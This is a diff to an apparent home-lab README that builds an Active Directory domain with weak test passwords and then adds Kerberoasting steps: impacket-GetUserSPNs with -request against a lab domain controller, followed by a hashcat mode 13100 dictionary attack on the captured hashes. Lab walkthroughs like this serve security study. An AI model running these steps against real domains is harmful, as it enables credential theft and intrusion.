@@ -330,7 +330,7 @@ We will add users, file share, and sharing account
 - Username = anyi Password = Password1
 - Username = oaklandUni Password = Iwillhackyou123
 - Username = Username Password = Password123
-
+- Username = Username Password = Password1
  
  
  ![image](https://user-images.githubusercontent.com/38595857/216215105-1a192bb8-da70-49f9-bf80-6d5dd5aaab43.png)
@@ -433,7 +433,7 @@ we will build out user machines
 
 
 - we now are adding user under admin
-- 
+
 ![image](https://user-images.githubusercontent.com/38595857/216223448-59f2c947-518e-4e63-b09f-0b885a934fe9.png)
 
 
@@ -452,8 +452,35 @@ Now lets perform a Kerberoasting attack
 ![image](https://user-images.githubusercontent.com/38595857/216228590-a4b129d0-8402-4314-83f6-04342de16a14.png)
 
 
+- We will use a command called 
+- Impacket-GetUserSPNs
+- (Service principal name)
+
+![image](https://user-images.githubusercontent.com/38595857/216229363-279281f9-1a52-4699-85b0-d1c52b159c5f.png)
+
+- We are now able to Kerberoast the account using the command
+- impacket-GetUserSPNs -dc-ip 192.168.11.128 SOCCER.local/Username
+- Enter the password
 
 
+![image](https://user-images.githubusercontent.com/38595857/216230121-5c1be911-8998-4fba-afcf-3447e3517482.png)
+
+
+- We will perform the kerbo attack to get the hash by using the command
+- impacket-GetUserSPNs -dc-ip 192.168.11.128 SOCCER.local/Username -request
+
+![image](https://user-images.githubusercontent.com/38595857/216230534-4f1e91c6-a819-4b17-8067-de9c8299d0ab.png)
+
+
+- We will then use Hash cat to crack the hash of the kerbo attack
+
+
+![image](https://user-images.githubusercontent.com/38595857/216230865-47c5a65c-9663-4853-9650-e96fe009a72c.png)
+
+
+- we will use this command to crack the hash.txt
+- hashcat -m 13100 -a 0 hash.txt wordlist.txt --force
+- -a 0 = dicationary attack
 
 
 
